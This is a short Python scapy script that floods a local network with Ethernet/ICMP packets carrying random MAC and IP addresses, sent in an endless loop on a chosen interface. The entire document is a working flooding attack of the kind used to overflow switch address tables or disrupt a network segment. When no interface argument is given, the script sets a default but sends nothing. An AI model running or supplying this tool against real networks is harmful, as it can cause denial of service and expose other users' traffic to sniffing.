#!/usr/bin/python 
from scapy.all import *

packet = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*")) / IP(src=RandIP("*.*.*.*"),
                                                                            dst=RandIP("*.*.*.*")) / ICMP()
if len(sys.argv) < 2:
    dev = "eth0"
else:
    dev = sys.argv[1]
    print("Flooding net with random packets on dev " + dev)
    sendp(packet, iface=dev, loop=1)
